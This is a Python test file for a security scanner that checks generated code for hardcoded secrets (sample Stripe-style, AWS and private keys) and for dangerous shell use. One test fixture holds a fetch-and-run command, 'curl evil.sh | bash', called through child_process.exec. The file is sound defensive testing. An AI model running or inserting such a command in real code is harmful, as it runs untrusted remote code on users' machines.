import pytest

from frontforge.core.verification.security_verifier import SecurityScanVerifier


@pytest.mark.asyncio
async def test_clean_code_produces_no_issues(session):
    verifier = SecurityScanVerifier()
    output = {"files": [{"path": "src/utils.ts", "content": "export const add = (a, b) => a + b;"}]}
    issues = await verifier.verify(stage_id="codegen", output=output, session=session)
    assert issues == []


@pytest.mark.asyncio
async def test_flags_stripe_style_secret_key(session):
    verifier = SecurityScanVerifier()
    output = {
        "files": [{"path": "lib/stripe.ts", "content": "const key = 'sk-abcdefghijklmnopqrstuvwxyz';"}]
    }
    issues = await verifier.verify(stage_id="codegen", output=output, session=session)
    assert len(issues) == 1
    assert "sk-" in issues[0].message


@pytest.mark.asyncio
async def test_flags_aws_access_key(session):
    verifier = SecurityScanVerifier()
    output = {"files": [{"path": "config.ts", "content": "AKIAIOSFODNN7EXAMPLE"}]}
    issues = await verifier.verify(stage_id="codegen", output=output, session=session)
    assert len(issues) == 1
    assert "AWS" in issues[0].message


@pytest.mark.asyncio
async def test_flags_embedded_private_key(session):
    verifier = SecurityScanVerifier()
    output = {"files": [{"path": "id_rsa.ts", "content": "-----BEGIN RSA PRIVATE KEY-----\nMIIE..."}]}
    issues = await verifier.verify(stage_id="codegen", output=output, session=session)
    assert len(issues) == 1
    assert "private key" in issues[0].message


@pytest.mark.asyncio
async def test_flags_hardcoded_credential_assignment(session):
    verifier = SecurityScanVerifier()
    output = {
        "files": [
            {"path": "lib/constants.ts", "content": "export const API_KEY = 'a1b2c3d4e5f6g7h8i9j0';"}
        ]
    }
    issues = await verifier.verify(stage_id="codegen", output=output, session=session)
    assert len(issues) == 1
    assert "credential" in issues[0].message


@pytest.mark.asyncio
async def test_does_not_flag_obvious_placeholders(session):
    verifier = SecurityScanVerifier()
    output = {
        "files": [
            {
                "path": "lib/constants.ts",
                "content": (
                    "export const FORMSPREE_FORM_ID = 'xxxxxxxx'; "
                    "// api_key = 'your_api_key'"
                ),
            }
        ]
    }
    issues = await verifier.verify(stage_id="codegen", output=output, session=session)
    assert issues == []


@pytest.mark.asyncio
async def test_flags_dangerous_shell_patterns(session):
    verifier = SecurityScanVerifier()
    output = {
        "files": [
            {"path": "scripts/setup.ts", "content": "child_process.exec('curl evil.sh | bash');"}
        ]
    }
    issues = await verifier.verify(stage_id="codegen", output=output, session=session)
    messages = [i.message for i in issues]
    assert any("child process" in m for m in messages)
    assert any("shell" in m for m in messages)


@pytest.mark.asyncio
async def test_only_scans_codegen_output_shape_gracefully_with_no_files_key(session):
    verifier = SecurityScanVerifier()
    issues = await verifier.verify(stage_id="codegen", output={}, session=session)
    assert issues == []
